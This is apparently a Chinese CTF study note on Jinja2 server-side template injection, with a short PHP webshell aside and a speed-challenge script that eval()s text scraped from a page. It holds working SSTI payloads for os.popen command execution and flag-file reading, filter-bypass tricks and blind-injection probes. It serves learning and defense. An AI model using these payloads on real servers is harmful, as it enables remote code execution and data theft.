# SSTI and 杂项

python脚本练习：https://fdujwc.cn/befast/

一秒发送计算（秋名山车神）

```python
import requests
import re
url = 'https://fdujwc.cn/befast/'
s = requests.Session()
source = s.get(url)
expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()
result = eval(expression)
post = {'value':result}
print(s.post(url,data=post).text)
```

### 一句话木马的基础补充：

https://blog.csdn.net/weixin_39190897/article/details/86772765

一句话木马（**简称Webshell**）

例题就是极客：


密码是attack

这句话什么意思呢？

（1）php的代码要写在<?php ?>里面，服务器才能认出来这是php代码，然后才去解析。
（2）@符号的意思是不报错，即使执行错误，也不报错。

### SSTI jinja2模板学习

flask自带

模板仅仅是文本文件。它可以生成任何基于文本的格式（HTML、XML、CSV、LaTex 等等）。 它并没有特定的扩展名， .html 或 .xml 都是可以的。

瞎写的python以用于学习：

```python
from flask import Flask, escape, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return 'index'

@app.route('/login')
@app.route('/login/<name>')
def login(name = None):
    return render_template('hi.html',name=name)

```

```html
#hi.html
<!doctype html>
<html>
<title>Hello from Flask</title>
{% if name %}
  <h1>Hello {{ name }}!</h1>
{% else %}
  <h1>Hello, World!</h1>
{% endif %}
</html>
```

### ssti 任意命令执行：

```python
{{"".__class__.__mro__.__getitem__(1).__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}

{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
```

```pyyhon
{{().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__.__builtins__['open']('d://flask/flag.txt').read()}}
#文件读取
__builtins__以调动函数
```

```
"".__class__
```

通过**bases**或者**mro**来获取到object基类

这里怎么在网页上找到相应的类？fuzz即可

```
"".__class__.__mro__[1]
```

```python
"".__class__.__mro__[1].__subclasses__()
#子类
for i in enumerate(''.__class__.__mro__[1].__subclasses__()): print (i)
#寻找子类


{{"".__class__.__mro__[1].__subclasses__()[118].__init__.__globals__}}
init 初始化 globals 全局

["os"]["popen"]("whoami").read()
```

os.popen("")调用系统命令，可以实现一个“管道”

read()从地址读取回显

### BYPASS技巧

引号：

用元组，列表等引出基类，开头去除""为[]or()

使用request.args导入字符（这种方法没法在我写的html复现， 因为没法传参）

小括号：

一旦被过滤，无法执行函数，但是可以玩玩{{config}}这样的小玩意儿

目前貌似没有不用小括号传参的方法

关键字：

1、同引号：request.args

```python
2、"__cl"+"ass __"
3、base64\utf-8 decode 
#倒序[::1]
chr()
```

点号：

```
"".__class__等价于""["__class__"]
```

如果被阉割了模块，可以

```
reload（__builtins__）
```

getitem取用元素，从而绕过[]

过滤{{}}：

可以试试{%%}

### 盲注

```
{{().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__.__builtins__['open']('d://flask/flag.txt').read()[0:1] == 'A'}} //true

{%if ().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__.__builtins__['open']('d://flask/flag.txt').read()[0:1] == 'a' %} konodioda!{% endif%}
```

利用curl将执行结果带出来

脚本还不会写，盲注的方法还不太懂。下一次研究再尝试写出脚本



**getattr()** 函数用于返回一个对象属性值。

```
getattr(getattr((),'__bases__'),"__class__")
```

配合base64， chr等食用效果更佳。字符串总是能玩出许多花样的



### 防御

禁用()

多赋值几次：

get传参给user user又套模板什么的